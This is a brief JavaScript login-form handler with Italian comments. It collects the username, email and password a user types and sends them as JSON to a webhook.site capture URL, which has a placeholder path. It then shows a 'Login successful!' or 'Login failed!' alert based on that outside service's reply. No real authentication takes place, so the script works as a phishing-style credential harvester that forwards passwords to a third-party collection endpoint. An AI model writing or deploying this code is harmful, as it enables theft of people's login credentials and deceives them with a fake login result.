document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Impedisce l'invio tradizionale del form

    const loginData = {
        username: document.getElementById('username').value,
        email: document.getElementById('email').value,
        password: document.getElementById('password').value
    };

    // Invia i dati in formato JSON
    fetch('https://webhook.site/your-custom-url', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(loginData)
    })
    .then(response => {
        if (response.ok) {
            alert('Login successful!');
        } else {
            alert('Login failed!');
        }
    })
    .catch(error => {
        alert('An error occurred!');
        console.error(error);
    });
});

